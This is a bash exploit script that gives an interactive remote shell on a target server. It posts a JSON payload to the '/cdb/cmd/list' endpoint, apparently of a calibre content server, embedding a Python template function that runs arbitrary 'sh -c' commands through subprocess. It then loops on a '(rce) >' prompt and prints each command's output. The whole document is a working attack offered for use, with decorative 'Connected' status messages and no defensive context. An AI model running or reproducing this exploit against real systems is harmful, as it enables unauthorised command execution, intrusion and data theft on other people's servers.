#!/bin/bash

if [ "$#" -lt 1 ]; then
    echo -e "\e[31musage:\e[0m $0 <target>"
    exit 1
fi

target="$1"

# colors
red='\e[31m'
green='\e[32m'
yellow='\e[33m'
cyan='\e[36m'
reset='\e[0m'

# display status messages
echo -e "${cyan}Setting up exploit...${reset}"
sleep 1
echo -e "${yellow}Waiting for ${target}...${reset}"
sleep 2
echo -e "${green}Connected...${reset}"
sleep 1
echo -e "${cyan}Getting rce [*]${reset}"
sleep 1

execute_command() {
    local cmd="$1"

    payload=$(cat <<EOF
[
    ["template"],
    "",
    "",
    "",
    1,
    "python:def evaluate(a, b):\\n import subprocess\\n try:\\n  return subprocess.check_output(['sh', '-c', '${cmd}']).decode()\\n except Exception as e:\\n  return str(e)"
]
EOF
    )

    response=$(curl -s -X POST "${target}/cdb/cmd/list" \
        -H "Content-Type: application/json" \
        -d "${payload}")

    result=$(echo "$response" | jq -r '.result.data.template | to_entries[0].value // "error: unable to retrieve output"')
    echo -e "${green}${result}${reset}"
}

sleep 0.2s

clear

while true; do
    echo -n -e "${yellow}(rce) > ${reset}"
    read cmd
    if [ "$cmd" == "exit" ]; then
        echo -e "${red}exiting...${reset}"
        break
    fi
    execute_command "$cmd"
done
